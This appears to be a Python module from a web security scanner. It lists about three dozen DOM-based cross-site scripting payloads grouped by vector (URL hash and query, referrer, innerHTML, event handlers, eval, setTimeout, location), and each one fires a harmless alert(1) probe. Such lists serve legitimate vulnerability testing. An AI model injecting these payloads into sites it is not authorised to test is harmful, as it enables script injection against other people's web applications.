"""
DOM-based XSS payloads
"""

DOM_PAYLOADS = [
    # Location hash payloads
    '#<script>alert(1)</script>',
    '#<img src=x onerror=alert(1)>',
    '#javascript:alert(1)',

    # Location search payloads
    '?q=<script>alert(1)</script>',
    '?q=<img src=x onerror=alert(1)>',
    '?q=javascript:alert(1)',

    # Document.referrer payloads
    '<script>history.pushState("", "", "/?referrer=<script>alert(1)</script>");</script>',
    '<script>history.pushState("", "", "/?referrer=<img src=x onerror=alert(1)>");</script>',
    '<script>history.pushState("", "", "/?referrer=javascript:alert(1)");</script>',

    # Document.URL payloads
    '<script>history.pushState("", "", "/<script>alert(1)</script>");</script>',
    '<script>history.pushState("", "", "/<img src=x onerror=alert(1)>");</script>',
    '<script>history.pushState("", "", "/javascript:alert(1)");</script>',

    # DOM manipulation payloads
    '<script>document.body.innerHTML="<script>alert(1)<\/script>";</script>',
    '<script>document.body.innerHTML="<img src=x onerror=alert(1)>";</script>',
    '<script>document.body.innerHTML="<iframe src=javascript:alert(1)></iframe>";</script>',

    # DOM insertion payloads
    '<script>document.body.insertAdjacentHTML("beforeend","<script>alert(1)<\/script>");</script>',
    '<script>document.body.insertAdjacentHTML("beforeend","<img src=x onerror=alert(1)>");</script>',
    '<script>document.body.insertAdjacentHTML("beforeend","<iframe src=javascript:alert(1)></iframe>");</script>',

    # DOM event handler payloads
    '<script>window.onload=function(){alert(1)};</script>',
    '<script>document.body.onload=function(){alert(1)};</script>',
    '<script>document.body.onclick=function(){alert(1)};</script>',

    # DOM element creation payloads
    '<script>var e=document.createElement("script");e.src="data:text/javascript,alert(1)";document.body.appendChild(e);</script>',
    '<script>var e=document.createElement("img");e.src="x";e.onerror=function(){alert(1)};document.body.appendChild(e);</script>',
    '<script>var e=document.createElement("iframe");e.src="javascript:alert(1)";document.body.appendChild(e);</script>',

    # DOM attribute manipulation payloads
    '<script>document.body.setAttribute("onload","alert(1)");</script>',
    '<script>document.body.setAttribute("onclick","alert(1)");</script>',
    '<script>document.body.setAttribute("onmouseover","alert(1)");</script>',

    # DOM eval payloads
    '<script>eval("alert(1)");</script>',
    '<script>Function("alert(1)")();</script>',
    '<script>new Function("alert(1)")();</script>',

    # DOM setTimeout/setInterval payloads
    '<script>setTimeout("alert(1)",100);</script>',
    '<script>setInterval("alert(1)",100);</script>',
    '<script>setTimeout(function(){alert(1)},100);</script>',

    # DOM location payloads
    '<script>location="javascript:alert(1)";</script>',
    '<script>location.href="javascript:alert(1)";</script>',
    '<script>location.replace("javascript:alert(1)");</script>',
]
